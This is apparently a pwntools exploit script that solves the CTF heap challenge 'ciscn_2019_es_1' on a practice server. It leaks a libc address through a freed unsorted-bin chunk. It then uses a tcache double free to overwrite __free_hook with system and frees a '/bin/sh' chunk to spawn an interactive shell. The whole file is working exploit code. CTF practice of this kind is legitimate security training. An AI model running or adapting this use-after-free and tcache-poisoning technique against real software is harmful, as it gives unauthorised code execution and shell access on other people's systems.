from pwn import *

#context.log_level = 'debug'

#p = process('./ciscn_2019_es_1')
p = remote('node4.buuoj.cn', 28195)
#libc = ELF('libc-2.27.so')
libc = ELF('libc-2.27.buu.so')

def alloc(size, name, call):
	p.sendlineafter(b'choice:', b'1')
	p.sendlineafter(b'size of compary\'s name\n', str(size).encode())
	p.sendafter(b'please input name:\n', name)
	p.sendafter(b'compary call:\n', call)

def show(index):
	p.sendlineafter(b'choice:', b'2')
	p.sendlineafter(b'index:', str(index).encode())

def delete(index):
	p.sendlineafter(b'choice:', b'3')
	p.sendlineafter(b'index:', str(index).encode())

#leak libc
alloc(0x420, b'a', b'a') #0
alloc(0x20, b'a', b'a') #1
delete(0)
show(0)

p.recvuntil(b'name:\n')
main_arena = u64(p.recv(6).ljust(8, b'\x00')) - 0x60
malloc_hook = main_arena - 0x10

libc_base = malloc_hook - libc.sym['__malloc_hook']

print('[+] libc_base -> {}'.format(hex(libc_base)))

#double free to overwrite free_hook
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

#print('[+] free_hook -> {}'.format(hex(free_hook)))

delete(1)
delete(1)
alloc(0x20, p64(free_hook), b'a') #2
alloc(0x20, p64(free_hook), b'a') #3
alloc(0x20, p64(system), b'/bin/sh') #4

alloc(0x30, b'/bin/sh', b'a') #5

delete(5)

p.interactive()